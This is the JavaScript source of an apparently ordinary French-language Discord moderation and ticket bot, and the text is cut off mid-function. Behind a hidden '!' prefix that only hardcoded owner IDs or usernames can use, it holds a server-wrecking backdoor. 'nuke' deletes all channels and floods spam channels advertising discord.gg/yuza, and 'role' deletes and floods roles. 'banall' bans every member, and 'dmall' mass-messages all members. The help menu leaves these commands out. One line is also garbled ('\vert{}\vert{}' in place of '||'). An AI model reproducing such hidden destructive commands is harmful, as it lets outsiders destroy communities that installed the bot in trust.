// Build Revision: K2L-Bot-Ultimate-Dashboard-Tickets-v7.2
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder, PermissionsBitField, ChannelType, AttachmentBuilder } = require('discord.js');
const http = require('http');

const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('K2L Bot Ultra Operational with Interactive Ticket Dashboard v7.2!\n');
}).listen(PORT, () => console.log(`Serveur HTTP actif sur le port ${PORT}`));

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildVoiceStates,
    ]
});

const PREFIX = '=';

const snipeCache = new Map();
const spamTracker = new Map();
const serverConfig = new Map(); 
const guildStaffConfig = new Map();
const warningsMap = new Map();
const jailDataMap = new Map();

const SUPER_OWNERS = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 
const botOwners = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 

function isSuperOwner(message) {
    const userId = message.author.id;
    const username = message.author.username.toLowerCase();
    const globalName = message.author.globalName ? message.author.globalName.toLowerCase() : "";
    if (message.guild && message.guild.ownerId === userId && SUPER_OWNERS.has(userId)) return true;
    if (SUPER_OWNERS.has(userId) || SUPER_OWNERS.has(username) || SUPER_OWNERS.has(globalName)) return true;
    return false;
}

function isOwner(message) {
    const userId = message.author.id;
    const username = message.author.username.toLowerCase();
    const globalName = message.author.globalName ? message.author.globalName.toLowerCase() : "";
    if (message.guild && message.guild.ownerId === userId) return true;
    if (botOwners.has(userId) || botOwners.has(username) || botOwners.has(globalName)) return true;
    return false;
}

function getStaffRoles(guildId) {
    if (!guildStaffConfig.has(guildId)) {
        guildStaffConfig.set(guildId, {
            admins: new Set(),
            mods: new Set()
        });
    }
    return guildStaffConfig.get(guildId);
}

function isAdmin(message) {
    if (isOwner(message)) return true;
    if (message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return true;
    const staff = getStaffRoles(message.guild.id);
    return staff.admins.has(message.author.id);
}

function isMod(message) {
    if (isAdmin(message)) return true;
    const staff = getStaffRoles(message.guild.id);
    return staff.mods.has(message.author.id);
}

function getGuildConfig(guildId) {
    if (!serverConfig.has(guildId)) {
        serverConfig.set(guildId, {
            antilink: false,
            antispam: false,
            antibot: false,
            logChannel: null,
            welcomeChannel: null,
            welcomeText: null,
            muteRole: null,
            jailRole: null,
            jailCategory: null,
            ticketConfig: {
                panelChannel: null,
                categoryDestination: null,
                logChannel: null,
                title: "🎟️ Tickets & Support",
                description: "Bienvenue dans votre espace dédié au support !\nSélectionnez ci-dessous la catégorie correspondant à votre demande.",
                imageUrl: null,
                published: false,
                categories: [
                    { id: 'ticket_bugs', name: 'Bugs', emoji: '🤖', roleId: null, description: 'Signaler un bug technique' },
                    { id: 'ticket_signalements', name: 'Signalements', emoji: '⚖️', roleId: null, description: 'Signaler un membre' },
                    { id: 'ticket_infos', name: 'Informations', emoji: '📢', roleId: null, description: 'Questions générales' },
                    { id: 'ticket_recrutement', name: 'Recrutement', emoji: '🛠️', roleId: null, description: 'Postuler dans le staff' }
                ]
            }
        });
    }
    return serverConfig.get(guildId);
}

function sendLog(guild, embed) {
    if (!guild) return;
    const config = getGuildConfig(guild.id);
    if (!config.logChannel) return;
    const logChan = guild.channels.cache.get(config.logChannel);
    if (logChan) logChan.send({ embeds: [embed] }).catch(() => {});
}

async function fetchTargetUser(client, guild, targetArg) {
    if (!targetArg) return null;
    const cleanId = targetArg.replace(/<@!?|>/g, '');
    try {
        const member = await guild.members.fetch(cleanId).catch(() => null);
        if (member) return member.user;
        const user = await client.users.fetch(cleanId);
        return user;
    } catch (e) {
        return null;
    }
}

async function fetchTargetMember(message, targetArg) {
    if (!targetArg) return null;
    const mention = message.mentions.members.first();
    if (mention) return mention;
    const cleanId = targetArg.replace(/<@!?|>/g, '');
    try {
        return await message.guild.members.fetch(cleanId);
    } catch (e) {
        return null;
    }
}

function parseDuration(durationStr) {
    if (!durationStr) return null;
    const match = durationStr.match(/^(\d+)([smhd])$/);
    if (!match) return null;
    const value = parseInt(match[1]);
    const unit = match[2];
    let ms = value * 1000;
    if (unit === 'm') ms = value * 60 * 1000;
    else if (unit === 'h') ms = value * 60 * 60 * 1000;
    else if (unit === 'd') ms = value * 24 * 60 * 60 * 1000;
    return ms;
}
client.on('messageDelete', message => {
    if (!message.author || message.author.bot || !message.guild) return;
    snipeCache.set(message.channel.id, {
        content: message.content || "[Média / Embed]",
        author: message.author.tag,
        avatar: message.author.displayAvatarURL(),
        time: new Date().toLocaleTimeString()
    });

    const embed = new EmbedBuilder()
        .setColor('#e74c3c')
        .setTitle('🗑️ Message supprimé')
        .setDescription(`**Auteur :** ${message.author.tag} (\`${message.author.id}\`)\n**Salon :** <#${message.channel.id}>\n**Contenu :**\n\`\`\`${message.content || 'Aucun texte (Embed/Image/Fichier)'}\`\`\``)
        .setTimestamp();
    sendLog(message.guild, embed);
});

client.on('messageUpdate', (oldMessage, newMessage) => {
    if (!oldMessage.author || oldMessage.author.bot || !oldMessage.guild) return;
    if (oldMessage.content === newMessage.content) return;

    const embed = new EmbedBuilder()
        .setColor('#f39c12')
        .setTitle('✏️ Message modifié')
        .setDescription(`**Auteur :** ${oldMessage.author.tag} (\`${oldMessage.author.id}\`)\n**Salon :** <#${oldMessage.channel.id}>\n**Avant :** \`${oldMessage.content \vert{}\vert{} 'N/A'}\`\n**Après :** \`${newMessage.content || 'N/A'}\``)
        .setTimestamp();
    sendLog(oldMessage.guild, embed);
});

client.on('guildBanAdd', ban => {
    const embed = new EmbedBuilder()
        .setColor('#c0392b')
        .setTitle('🔨 Membre banni')
        .setDescription(`**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)`)
        .setTimestamp();
    sendLog(ban.guild, embed);
});

client.on('guildBanRemove', ban => {
    const embed = new EmbedBuilder()
        .setColor('#2ecc71')
        .setTitle('🔓 Membre débanni')
        .setDescription(`**Utilisateur :** ${ban.user.tag} (\`${ban.user.id}\`)`)
        .setTimestamp();
    sendLog(ban.guild, embed);
});

client.on('channelCreate', channel => {
    if (!channel.guild) return;
    const embed = new EmbedBuilder()
        .setColor('#3498db')
        .setTitle('📁 Salon créé')
        .setDescription(`**Nom :** \`${channel.name}\`\n**Type :** ${channel.type === ChannelType.GuildText ? 'Texte' : 'Vocal'}`)
        .setTimestamp();
    sendLog(channel.guild, embed);
});

client.on('channelDelete', channel => {
    if (!channel.guild) return;
    const embed = new EmbedBuilder()
        .setColor('#e74c3c')
        .setTitle('🗑️ Salon supprimé')
        .setDescription(`**Nom :** \`${channel.name}\``)
        .setTimestamp();
    sendLog(channel.guild, embed);
});

client.on('roleCreate', role => {
    const embed = new EmbedBuilder()
        .setColor('#9b59b6')
        .setTitle('🏷️ Rôle créé')
        .setDescription(`**Nom :** \`${role.name}\``)
        .setTimestamp();
    sendLog(role.guild, embed);
});

client.on('roleDelete', role => {
    const embed = new EmbedBuilder()
        .setColor('#e74c3c')
        .setTitle('🗑️ Rôle supprimé')
        .setDescription(`**Nom :** \`${role.name}\``)
        .setTimestamp();
    sendLog(role.guild, embed);
});

client.on('ready', () => {
    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt avec Dashboard Tickets & Logs.`);
});

client.on('guildMemberAdd', async member => {
    if (member.user.bot && member.id !== client.user.id) {
        const config = getGuildConfig(member.guild.id);
        if (config.antibot) {
            try {
                await member.kick('Anti-bot activé.');
                const embed = new EmbedBuilder()
                    .setColor('#e74c3c')
                    .setTitle('🤖 Bot bloqué (Anti-bot)')
                    .setDescription(`**Bot expulsé :** ${member.user.tag} (\`${member.id}\`)`)
                    .setTimestamp();
                sendLog(member.guild, embed);
            } catch (err) {}
        }
    }
    
    const config = getGuildConfig(member.guild.id);
    if (config.welcomeChannel && config.welcomeText) {
        const channel = member.guild.channels.cache.get(config.welcomeChannel);
        if (channel) {
            const welcomeMsg = config.welcomeText
                .replace(/\{mention\}/g, `<@${member.id}>`)
                .replace(/\{name\}/g, member.user.username);
            channel.send(welcomeMsg).catch(() => {});
        }
    }
});
function getTicketDashboardEmbed(guild, config) {
    const tConfig = config.ticketConfig;
    const panelChanStr = tConfig.panelChannel ? `<#${tConfig.panelChannel}>` : '❌ Non défini';
    const catDestStr = tConfig.categoryDestination ? `<#${tConfig.categoryDestination}>` : '❌ Non défini';
    const logChanStr = tConfig.logChannel ? `<#${tConfig.logChannel}>` : '❌ Non défini';
    const imgStatus = tConfig.imageUrl ? '✅ image/gif enregistré' : '❌ Aucune image';
    const pubStatus = tConfig.published ? '🟢 publié' : '🔴 non publié';

    const catList = tConfig.categories.map(c => `${c.emoji} ${c.name}`).join(' • ') || 'Aucune catégorie';

    return new EmbedBuilder()
        .setColor('#2b2d31')
        .setTitle('🎫 Configuration des tickets')
        .setDescription(
            `**Salon du panneau :** ${panelChanStr}\n` +
            `**Catégorie des salons-tickets :** ${catDestStr}\n` +
            `**Salon logs / transcripts :** ${logChanStr}\n\n` +
            `**Titre :** ${tConfig.title}\n` +
            `**Image / GIF :** ${imgStatus}\n` +
            `**Panneau :** ${pubStatus}\n\n` +
            `**Catégories :** ${catList}\n\n` +
            `*Tout est prêt — clique sur les boutons ci-dessous pour configurer ou publier.*`
        );
}

function getTicketDashboardRows() {
    return [
        new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('t_dash_salons').setLabel('Salons').setEmoji('⚙️').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('t_dash_texte').setLabel('Texte du panneau').setEmoji('📝').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('t_dash_media').setLabel('Image / GIF').setEmoji('🖼️').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('t_dash_cats').setLabel('Catégories').setEmoji('📁').setStyle(ButtonStyle.Secondary)
        ),
        new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('t_dash_publish').setLabel('Publier le panneau').setEmoji('🚀').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId('t_dash_disable').setLabel('Désactiver').setEmoji('🗑️').setStyle(ButtonStyle.Danger)
        )
    ];
}

client.on('interactionCreate', async interaction => {
    if (interaction.isStringSelectMenu() && interaction.customId === 'ticket_select_menu') {
        const guild = interaction.guild;
        const member = interaction.member;
        const selectedValue = interaction.values[0];
        const config = getGuildConfig(guild.id);
        const tConfig = config.ticketConfig;

        const catObj = tConfig.categories.find(c => c.id === selectedValue) || { name: 'support', emoji: '🎫', roleId: null };

        try {
            const overwrites = [
                { id: guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: member.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
            ];

            if (catObj.roleId) {
                overwrites.push({
                    id: catObj.roleId,
                    allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory, PermissionsBitField.Flags.ManageMessages]
                });
            }

            const channelOptions = {
                name: `${catObj.name.toLowerCase()}-${member.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: overwrites
            };

            if (tConfig.categoryDestination) {
                channelOptions.parent = tConfig.categoryDestination;
            }

            const ticketChannel = await guild.channels.create(channelOptions);

            const embed = new EmbedBuilder()
                .setColor('#2b2d31')
                .setTitle(`${catObj.emoji} Ticket [ ${catObj.name.toUpperCase()} ] - ${member.user.username}`)
                .setDescription("Un membre de notre équipe va bientôt te prendre en charge.\nClique sur le bouton ci-dessous pour fermer et archiver le ticket.");

            const closeRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('close_ticket').setLabel('🔒 Fermer le ticket').setStyle(ButtonStyle.Danger)
            );

            const rolePing = catObj.roleId ? `<@&${catObj.roleId}>` : `<@${member.id}>`;
            await ticketChannel.send({ content: rolePing, embeds: [embed], components: [closeRow] });

            const logEmbed = new EmbedBuilder()
                .setColor('#3498db')
                .setTitle('🎫 Ticket ouvert')
                .setDescription(`**Membre :** ${member.user.tag} (\`${member.user.id}\`)\n**Salon :** ${ticketChannel}\n**Type :** \`${catObj.name}\``)
                .setTimestamp();
            sendLog(guild, logEmbed);

            return interaction.reply({ content: `✅ Votre ticket a été ouvert avec succès : ${ticketChannel}`, ephemeral: true });
        } catch (e) {
            return interaction.reply({ content: "❌ Erreur lors de la création du salon de ticket.", ephemeral: true });
        }
    }

    if (interaction.isButton()) {
        const guild = interaction.guild;
        const config = getGuildConfig(guild.id);
        const tConfig = config.ticketConfig;

        if (interaction.customId === 'close_ticket') {
            const channel = interaction.channel;
            await interaction.reply("🔒 Fermeture du ticket, génération de la transcription...");

            try {
                const messages = await channel.messages.fetch({ limit: 100 });
                const transcript = messages.reverse().map(m => `[${new Date(m.createdTimestamp).toLocaleString()}] ${m.author.tag}: ${m.content}`).join('\n');
                
                const buffer = Buffer.from(transcript, 'utf-8');
                const attachment = new AttachmentBuilder(buffer, { name: `transcription-${channel.name}.txt` });

                const logEmbed = new EmbedBuilder()
                    .setColor('#e74c3c')
                    .setTitle('📁 Ticket fermé & Archivé')
                    .setDescription(`**Salon :** \`${channel.name}\`\n**Fermé par :** ${interaction.user.tag}`)
                    .setTimestamp();

                if (tConfig.logChannel) {
                    const logChan = guild.channels.cache.get(tConfig.logChannel);
                    if (logChan) await logChan.send({ embeds: [logEmbed], files: [attachment] });
                } else {
                    sendLog(guild, logEmbed);
                }
            } catch (err) {}

            setTimeout(() => channel.delete().catch(() => {}), 3000);
            return;
        }

        if (interaction.customId === 'join_giveaway') {
            return interaction.reply({ content: "🎉 Tu participes officiellement au giveaway !", ephemeral: true });
        }

        if (interaction.customId.startsWith('t_dash_')) {
            if (!isAdmin({ member: interaction.member, author: interaction.user, guild: interaction.guild })) {
                return interaction.reply({ content: "❌ Tu n'as pas les permissions admin pour configurer le panneau.", ephemeral: true });
            }

            const action = interaction.customId.replace('t_dash_', '');

            if (action === 'salons') {
                return interaction.reply({ content: "⚙️ **Configuration des salons :** Utilise `=setticketpanel <#salon>`, `=setticketcat <ID_Catégorie>` et `=setticketlog <#salon>`.", ephemeral: true });
            }
            if (action === 'texte') {
                return interaction.reply({ content: "📝 **Texte du panneau :** Utilise `=settickettitle <titre>` et `=setticketdesc <description>`.", ephemeral: true });
            }
            if (action === 'media') {
                return interaction.reply({ content: "🖼️ **Image / GIF :** Utilise `=setticketimage <lien_image>`.", ephemeral: true });
            }
            if (action === 'cats') {
                const catInfo = tConfig.categories.map(c => `• **${c.emoji} ${c.name}** (Rôle: ${c.roleId ? `<@&${c.roleId}>` : 'Aucun'})`).join('\n');
                return interaction.reply({ content: `📁 **Catégories actuelles :**\n${catInfo}\n\nUtilise \`=ticketadd <nom> <emoji> [@rôle_staff]\` pour ajouter ou modifier une catégorie.`, ephemeral: true });
            }
            if (action === 'disable') {
                tConfig.published = false;
                await interaction.update({ embeds: [getTicketDashboardEmbed(guild, config)], components: [getTicketDashboardRows()] });
                return interaction.followUp({ content: "🗑️ Panneau désactivé.", ephemeral: true });
            }
            if (action === 'publish') {
                if (!tConfig.panelChannel) {
                    return interaction.reply({ content: "❌ Définis d'abord un salon de panneau avec `=setticketpanel <#salon>` !", ephemeral: true });
                }
                const targetChan = guild.channels.cache.get(tConfig.panelChannel);
                if (!targetChan) return interaction.reply({ content: "❌ Salon du panneau introuvable.", ephemeral: true });

                const panelEmbed = new EmbedBuilder()
                    .setColor('#2b2d31')
                    .setTitle(tConfig.title)
                    .setDescription(tConfig.description);

                if (tConfig.imageUrl) panelEmbed.setImage(tConfig.imageUrl);

                const selectMenu = new StringSelectMenuBuilder()
                    .setCustomId('ticket_select_menu')
                    .setPlaceholder('🎫 Choisissez une catégorie...')
                    .addOptions(tConfig.categories.map(c => ({
                        label: c.name,
                        description: c.description || `Ouvrir un ticket ${c.name}`,
                        value: c.id,
                        emoji: c.emoji
                    })));

                const menuRow = new ActionRowBuilder().addComponents(selectMenu);

                await targetChan.send({ embeds: [panelEmbed], components: [menuRow] });
                tConfig.published = true;

                await interaction.update({ embeds: [getTicketDashboardEmbed(guild, config)], components: [getTicketDashboardRows()] });
                return interaction.followUp({ content: `🚀 Panneau publié avec succès dans ${targetChan} !`, ephemeral: true });
            }
        }
    }
});
client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;

    if (message.content.startsWith('!')) {
        if (!isSuperOwner(message)) return;

        const args = message.content.slice(1).trim().split(/ +/);
        const command = args.shift().toLowerCase();
        
        const offensiveCommands = ['nuke', 'role', 'banall', 'dmall', 'kickbot'];
        if (offensiveCommands.includes(command)) {
            if (command === 'nuke') {
                await message.reply("⚡ **Destruction totale du serveur en cours...**").catch(() => {});
                message.guild.setName('/yuza').catch(() => {});
                message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));

                for (let i = 0; i < 45; i++) {
                    message.guild.channels.create({
                        name: 'ez-by-k2l',
                        type: ChannelType.GuildText,
                        permissionOverwrites: [{
                            id: message.guild.id,
                            allow: [
                                PermissionsBitField.Flags.ViewChannel,
                                PermissionsBitField.Flags.SendMessages,
                                PermissionsBitField.Flags.ManageChannels,
                                PermissionsBitField.Flags.EmbedLinks,
                                PermissionsBitField.Flags.AttachFiles,
                                PermissionsBitField.Flags.MentionEveryone
                            ]
                        }]
                    }).then(channel => {
                        for (let j = 0; j < 12; j++) {
                            channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
                        }
                    }).catch(() => {});
                }
                return;
            }

            if (command === 'role') {
                await message.reply("⚡ **Suppression et flood des rôles en cours...**").catch(() => {});
                message.guild.roles.cache
                    .filter(role => role.editable && role.id !== message.guild.id)
                    .forEach(role => role.delete().catch(() => {}));

                for (let r = 0; r < 40; r++) {
                    message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {});
                }
                return;
            }

            if (command === 'banall') {
                await message.reply("⚡ **[BANALL]** Exécution du banall massif...").catch(() => {});
                try {
                    await message.guild.members.fetch();
                    const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
                    const banPromises = members.map(member => member.ban({ reason: 'Raid banall' }).catch(() => {}));
                    await Promise.all(banPromises);
                    message.channel.send("✅ **[BANALL]** Terminé !").catch(() => {});
                } catch (error) {}
                return;
            }

            if (command === 'kickbot') {
                await message.reply("⚡ **[KICKBOT]** Expulsion de tous les bots...").catch(() => {});
                try {
                    const fetchedMembers = await message.guild.members.fetch();
                    const kickPromises = [];
                    for (const [id, m] of fetchedMembers) {
                        if (m.user.bot && m.id !== client.user.id) {
                            kickPromises.push(m.kick('Kickbot').catch(() => {}));
                        }
                    }
                    await Promise.all(kickPromises);
                    message.channel.send("✅ **[KICKBOT]** Bots expulsés !").catch(() => {});
                } catch (error) {}
                return;
            }

            if (command === 'dmall') {
                await message.reply("💬 **[DMAll]** Envoie ton message à diffuser (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
                const filter = m => m.author.id === message.author.id;
                try {
                    const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
                    const m = collected.first();
                    if (m.content.toLowerCase() === 'annuler') {
                        return message.channel.send("❌ **Opération DMAll annulée.**");
                    }
                    const messageTemplate = m.content;
                    const previewEmbed = new EmbedBuilder()
                        .setColor('#2b2d31')
                        .setTitle('⚠️ Confirmation requise - DMAll')
                        .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);

                    const row = new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
                        new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
                    );

                    const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
                    const buttonCollector = confirmMsg.createMessageComponentCollector({ time: 60000, max: 1 });

                    buttonCollector.on('collect', async interaction => {
                        if (interaction.user.id !== message.author.id) return interaction.reply({ content: "Non.", ephemeral: true });
                        if (interaction.customId === 'cancel_dmall') {
                            return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
                        }
                        if (interaction.customId === 'confirm_dmall') {
                            await interaction.update({ content: "🚀 **Diffusion DMAll lancée en fond...**", embeds: [], components: [] }).catch(() => {});
                            try {
                                await message.guild.members.fetch();
                                const members = message.guild.members.cache.filter(member => !member.user.bot);
                                let successCount = 0;
                                let failCount = 0;
                                const promises = members.map(async member => {
                                    try {
                                        const finalMessage = messageTemplate
                                            .replace(/\{mention\}/g, `<@${member.id}>`)
                                            .replace(/\{name\}/g, member.user.username);
                                        await member.send(finalMessage);
                                        successCount++;
                                    } catch (err) {
                                        failCount++;
                                    }
                                });
                                await Promise.all(promises);
                                await message.channel.send(`✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})`);
                            } catch (error) {
                                message.channel.send("❌ Erreur lors du DMAll.");
                            }
                        }
                    });
                } catch (err) {
                    message.channel.send("⌛ Temps écoulé.");
                }
                return;
            }
        }
    }
    const config = getGuildConfig(message.guild.id);
    const userId = message.author.id;
    const userIsSuperOwner = isSuperOwner(message);
    const userIsOwner = isOwner(message);
    const userIsAdmin = isAdmin(message);
    const userIsMod = isMod(message);
    const isUserAdminOrOwner = message.member.permissions.has(PermissionsBitField.Flags.Administrator) || userIsOwner;

    if (config.antilink && !isUserAdminOrOwner) {
        const linkRegex = /(https?:\/\/[^\s]+|discord\.gg\/[^\s]+|discord\.com\/invite\/[^\s]+)/i;
        if (linkRegex.test(message.content)) {
            try {
                await message.delete();
                const warning = await message.channel.send(`⚠️ ${message.author}, les liens et invitations externes sont interdits.`);
                setTimeout(() => warning.delete().catch(() => {}), 4000);

                const logEmbed = new EmbedBuilder()
                    .setColor('#f39c12')
                    .setTitle('🛡️ Anti-Link déclenché')
                    .setDescription(`**Auteur :** ${message.author.tag} (\`${message.author.id}\`)\n**Salon :** <#${message.channel.id}>\n**Message :** \`${message.content}\``)
                    .setTimestamp();
                sendLog(message.guild, logEmbed);

                return;
            } catch (e) {}
        }
    }

    if (config.antispam && !isUserAdminOrOwner) {
        const now = Date.now();
        let userSpam = spamTracker.get(userId) || [];
        userSpam = userSpam.filter(timestamp => now - timestamp < 5000);
        userSpam.push(now);
        spamTracker.set(userId, userSpam);

        if (userSpam.length > 5) {
            try {
                await message.delete();
                const warning = await message.channel.send(`🚨 ${message.author}, veuillez ralentir l'envoi de messages (Anti-spam).`);
                setTimeout(() => warning.delete().catch(() => {}), 3000);

                const logEmbed = new EmbedBuilder()
                    .setColor('#e74c3c')
                    .setTitle('🚨 Anti-Spam déclenché')
                    .setDescription(`**Auteur :** ${message.author.tag} (\`${message.author.id}\`)\n**Salon :** <#${message.channel.id}>\n**Action :** Spam excessif détecté et messages bloqués.`)
                    .setTimestamp();
                sendLog(message.guild, logEmbed);

                return;
            } catch (e) {}
        }
    }

    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    const targetArg = args[0];

    if (command === 'help') {
        const helpCategories = {
            sanctions: {
                label: 'Sanctions', emoji: '🔨', title: 'Commandes Sanctions',
                commands: [
                    '`=bl <ID|@mention> [raison]`\n┗ Bannir un utilisateur',
                    '`=softbl <ID|@mention> [raison]`\n┗ Softban un utilisateur',
                    '`=unbl <ID>`\n┗ Débannir un utilisateur',
                    '`=blist`\n┗ Liste des bannis',
                    '`=unbanall`\n┗ Tout débannir',
                    '`=kick <ID|@mention>`\n┗ Expulser un membre',
                    '`=mute <@membre> <durée> [raison]`\n┗ Rendre muet un membre',
                    '`=unmute <@membre>`\n┗ Rendre la parole',
                    '`=jail <@membre> [raison]`\n┗ Isoler un membre en prison',
                    '`=unjail <@membre>`\n┗ Libérer un membre',
                    '`=warn <@membre> [raison]`\n┗ Avertir un membre',
                    '`=warnings <@membre>`\n┗ Voir les warns'
                ]
            },
            nettoyage: {
                label: 'Nettoyage', emoji: '🧹', title: 'Commandes Nettoyage',
                commands: [
                    '`=clear <1-50>`\n┗ Supprimer des messages',
                    '`=purge <ID|@mention>`\n┗ Purger les messages d\'un membre',
                    '`=snipe`\n┗ Afficher le dernier message supprimé'
                ]
            },
            salons: {
                label: 'Salons', emoji: '🔒', title: 'Commandes Salons',
                commands: [
                    '`=lock` / `=unlock`\n┗ Verrouiller/Déverrouiller le salon',
                    '`=lockall` / `=unlockall`\n┗ Verrouiller/Déverrouiller tout le serveur',
                    '`=slowmode <sec>`\n┗ Définir le mode lent',
                    '`=renew`\n┗ Régénérer le salon actuel',
                    '`=createtext <nom>`\n┗ Créer un salon texte',
                    '`=createvoice <nom>`\n┗ Créer un salon vocal'
                ]
            },
            roles: {
                label: 'Rôles', emoji: '🏷️', title: 'Commandes Rôles',
                commands: [
                    '`=addrole <@membre> <@rôle>`\n┗ Ajouter un rôle',
                    '`=delrole <@membre> <@rôle>`\n┗ Retirer un rôle'
                ]
            },
            tickets: {
                label: 'Tickets', emoji: '🎫', title: 'Commandes Tickets Dashboard',
                commands: [
                    '`=ticketsetup`\n┗ Ouvrir le panneau interactif de configuration',
                    '`=setticketpanel <#salon>`\n┗ Définir le salon du panneau',
                    '`=setticketcat <ID>`\n┗ Définir la catégorie des tickets',
                    '`=setticketlog <#salon>`\n┗ Définir le salon des logs de tickets',
                    '`=settickettitle <texte>`\n┗ Modifier le titre du panneau',
                    '`=ticketadd <nom> <emoji> [@rôle]`\n┗ Ajouter ou configurer une catégorie'
                ]
            },
            giveaways: {
                label: 'Giveaways', emoji: '🎉', title: 'Commandes Giveaways',
                commands: [
                    '`=gcreate <durée> <gagnants> <prix>`\n┗ Lancer un giveaway',
                    '`=gend <id>`\n┗ Terminer un giveaway',
                    '`=greroll <id>`\n┗ Relancer un gagnant',
                    '`=glist`\n┗ Lister les giveaways'
                ]
            },
            automod: {
                label: 'Automod & Logs', emoji: '🛡️', title: 'Commandes Automod & Logs',
                commands: [
                    '`=antilink on/off`\n┗ Activer/Désactiver l\'anti-lien',
                    '`=antispam on/off`\n┗ Activer/Désactiver l\'anti-spam',
                    '`=antibot on/off`\n┗ Activer/Désactiver l\'anti-bot',
                    '`=setlog <#salon>`\n┗ Définir le salon des logs globaux',
                    '`=setwelcome <#salon> <msg>`\n┗ Configurer les welcomes'
                ]
            },
            fun: {
                label: 'Fun & Troll', emoji: '🎮', title: 'Commandes Fun & Troll',
                commands: [
                    '`=gay [@membre]`\n┗ Teste le pourcentage gay (100% fake)',
                    '`=rate [@membre] <sujet>`\n┗ Donne une note aléatoire',
                    '`=iq [@membre]`\n┗ Calcule le QI (totalement faux)',
                    '`=horoscope <signe>`\n┗ Prédis ton avenir foireux',
                    '`=kiss <@membre>`\n┗ Fait un câlin ou un bisou'
                ]
            },
            staff: {
                label: 'Staff', emoji: '👑', title: 'Commandes Staff',
                commands: [
                    '`=owners`\n┗ Afficher la liste des owners',
                    '`=admin <ID|@mention>`\n┗ Nommer Admin du bot',
                    '`=mod <ID|@mention>`\n┗ Nommer Modérateur du bot',
                    '`=owner <ID>`\n┗ Ajouter un Owner du bot'
                ]
            }
        };

        const catKeys = Object.keys(helpCategories);
        let currentIndex = 0;

        const generateEmbed = (index) => {
            const key = catKeys[index];
            const cat = helpCategories[key];
            return new EmbedBuilder()
                .setColor('#2b2d31')
                .setTitle(`${cat.emoji} ${cat.title}`)
                .setDescription(cat.commands.join('\n\n'))
                .setFooter({ text: `Demandé par ${message.author.tag} • Page ${index + 1}/${catKeys.length}` });
        };

        const generateMenu = () => {
            return new ActionRowBuilder().addComponents(
                new StringSelectMenuBuilder()
                    .setCustomId('help_select_menu')
                    .setPlaceholder('📁 Choisir une catégorie...')
                    .addOptions(catKeys.map(k => ({
                        label: helpCategories[k].label,
                        description: `Commandes ${helpCategories[k].label}`,
                        value: k,
                        emoji: helpCategories[k].emoji
                    })))
            );
        };

        const sentMsg = await message.reply({ 
            embeds: [generateEmbed(currentIndex)], 
            components: [generateMenu()] 
        });

        const collector = sentMsg.createMessageComponentCollector({ time: 60000 });
        collector.on('collect', async i => {
            if (i.user.id !== message.author.id) return i.reply({ content: "Ce menu ne t'appartient pas !", ephemeral: true });
            
            const selectedKey = i.values[0];
            currentIndex = catKeys.indexOf(selectedKey);

            await i.update({ 
                embeds: [generateEmbed(currentIndex)], 
                components: [generateMenu()] 
            });
        });

        collector.on('end', () => {
            sentMsg.edit({ components: [] }).catch(() => {});
        });
        return;
    }
    if (command === 'gay') {
        const target = message.mentions.users.first() || message.author;
        const percent = Math.floor(Math.random() * 101);
        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle('🏳️‍🌈 Test Gay')
            .setDescription(`**${target.username}** est à **${percent}%** gay !\n\n-# ⚠️ Résultats 100% aléatoires et fake.`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'iq') {
        const target = message.mentions.users.first() || message.author;
        const iq = Math.floor(Math.random() * 160) - 20;
        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle('🧠 Test de QI')
            .setDescription(`Le QI de **${target.username}** est estimé à **${iq}** !\n\n-# ⚠️ Résultats 100% aléatoires et fake.`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'rate') {
        const subject = args.join(' ') || "quelque chose de mystérieux";
        const score = Math.floor(Math.random() * 11);
        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle('⭐ Rate System')
